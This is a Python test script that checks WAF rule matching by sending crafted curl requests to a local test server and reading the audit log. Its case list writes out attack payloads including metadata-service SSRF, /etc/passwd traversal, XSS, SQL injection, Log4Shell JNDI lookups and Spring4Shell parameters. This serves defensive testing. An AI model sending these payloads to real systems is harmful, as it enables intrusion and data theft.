#!/usr/bin/env python3
# Throwaway: send one attack per rule and check the terminating rule in the AWSWAF_SUMMARY.
import json, subprocess, time, urllib.parse
U = 'http://127.0.0.1:18096'
H = ['-H', 'Host: app.example.com']
long_cookie = 'c=' + 'a' * 10300
cases = [
  ('clean', 0, ['/web?x=1']),
  ('1100010', 1100010, ['-H', 'X-Forwarded-For: 203.0.113.7', '/']),
  ('1200010', 1200010, ['-A', '', '/']),
  ('1200020', 1200020, ['-A', 'Mozilla/5.0 nikto/2.1', '/']),
  ('1200030', 1200030, ['/?q=' + 'a' * 2100]),
  ('1200040', 1200040, ['-H', 'Cookie: ' + long_cookie, '/']),
  ('1200050', 1200050, ['--data-binary', '@/tmp/pevr/b9k', '/']),
  ('1200050chunked', 1200050, ['-H', 'Transfer-Encoding: chunked', '--data-binary', '@/tmp/pevr/b9k', '/']),
  ('1200060', 1200060, ['/' + 'p' * 1100]),
  ('1200070', 1200070, ['--data', 'u=http://169.254.169.254/latest/meta-data/', '/']),
  ('1200080', 1200080, ['-H', 'Cookie: u=http%3A%2F%2F169.254.169.254%2F', '/']),
  ('1200090', 1200090, ['/x/169.254.169.254/latest']),
  ('1200100', 1200100, ['/?u=http://169.254.169.254/latest/']),
  ('1200110', 1200110, ['/?f=../../etc/passwd']),
  ('1200110b', 1200110, ['/?f=%2e%2e%2f%2e%2e%2fx']),
  ('1200120', 1200120, ['--path-as-is', '/a/b/../c']),
  ('1200130', 1200130, ['--data', 'f=../../x', '/']),
  ('1200130json', 1200130, ['-H', 'Content-Type: application/json', '--data', '{"f":"../../x"}', '/']),
  ('1200140', 1200140, ['/backup/site.bak']),
  ('1200150', 1200150, ['/?f=config.ini']),
  ('1200160', 1200160, ['/?u=http://10.1.2.3/x']),
  ('1200170', 1200170, ['--data', 'u=ftp://192.168.1.1/x', '/']),
  ('1200180', 1200180, ['/go/http://10.1.2.3/x']),
  ('1200190', 1200190, ['-H', 'Cookie: s=<script>alert(1)</script>', '/']),
  ('1200200', 1200200, ['/?q=<script>alert(1)</script>']),
  ('1200210', 1200210, ['--data', 'q=<img src=x onerror=alert(1)>', '/']),
  ('1200210mp', 1200210, ['-F', 'f=@/tmp/pevr/x.html', '/']),
  ('1200220', 1200220, ['/%3Cscript%3Ealert(1)%3C/script%3E']),
  ('1300010', 1300010, ['-H', 'X-Api: java.lang.Runtime', '/']),
  ('1300020', 1300020, ['--data', 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=x', '/']),
  ('1300030', 1300030, ['/x/java.lang.ProcessBuilder']),
  ('1300040', 1300040, ['/?a=T(java.lang.Runtime).getRuntime().exec(1)']),
  ('1300050', 1300050, ['-H', 'Host: localhost', '/']),
  ('1300050v6', 1300050, ['-H', 'Host: [::1]:8080', '/']),
  ('1300060', 1300060, ['-X', 'PROPFIND', '/']),
  ('1300070', 1300070, ['/app/WEB-INF/web.xml']),
  ('1300080', 1300080, ['-H', 'X-Api-Version: ${jndi:ldap://e.com/a}', '/']),
  ('1300090', 1300090, ['-g', '/?x=${jndi:ldap://e.com/a}']),
  ('1300100', 1300100, ['--data', 'x=${jndi:ldap://e.com/a}', '/']),
  ('1300110', 1300110, ['/$%7Bjndi:ldap://e.com/a%7D']),
  ('1300120', 1300120, ['-H', 'Next-Action: x', '--data', '{"then":"$1:__proto__:then"}', '/']),
  ('1450010', 1450010, ['-H', 'X-Forwarded-For: TORIP', '/']),
  ('1400010', 1400010, ["/?id=1' OR '1'='1"]),
  ('1400030', 1400030, ['--data', "id=1 union all select password from users", '/']),
  ('odoo_jsonrpc', 0, ['-H', 'Content-Type: application/json', '--data', '{"jsonrpc":"2.0","method":"call","params":{"model":"res.partner","method":"read","args":[[1]]}}', '/web/dataset/call_kw']),
  ('first-wins', 1200010, ['-A', '', '-H', 'Host: localhost', '/']),
]
tor = [l.strip().split('/')[0] for l in open('/tmp/pevr/lists/AnonymousIPList.txt') if l.strip() and not l.startswith('#')][0]
open('/tmp/pevr/b9k', 'w').write('a=' + 'x' * 9000)
open('/tmp/pevr/x.html', 'w').write('<script>alert(1)</script>')
subprocess.run(['docker', 'exec', 'pevm2', 'sh', '-c', ': > /tmp/audit.log'])
res = []
for name, want, args in cases:
    args = [a.replace('TORIP', tor) for a in args]
    url = U + urllib.parse.quote(args[-1], safe="/?=&%:$@;,'+()<>*{}")
    hdr = H if not any('Host:' in a for a in args) else []
    st = subprocess.run(['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', '-H', 'X-Case: ' + name] + hdr + args[:-1] + [url],
                        capture_output=True, text=True).stdout
    res.append((name, want, st))
time.sleep(1)
log = subprocess.run(['docker', 'exec', 'pevm2', 'cat', '/tmp/audit.log'], capture_output=True, text=True).stdout
summ = {}
for l in log.splitlines():
    t = json.loads(l)['transaction']
    case = t['request']['headers'].get('X-Case') or t['request']['headers'].get('x-case')
    s = [m['details']['data'] for m in t['messages'] if m['message'] == 'AWSWAF_SUMMARY']
    hits = [m['message'].split()[1] for m in t['messages'] if m['message'].startswith('AWSWAF 1')]
    summ[case] = (s[0] if s else 'NOSUMMARY', hits)
bad = 0
for name, want, st in res:
    s, hits = summ.get(name, ('MISSING', []))
    term = s.split('term=')[1].split(';')[0] if 'term=' in s else '?'
    ok = str(want) == term and (st == '403') == (want != 0)
    bad += not ok
    print(('OK  ' if ok else 'FAIL'), name, st, 'term=' + term, 'hits=' + ','.join(hits))
print('FAILS', bad)
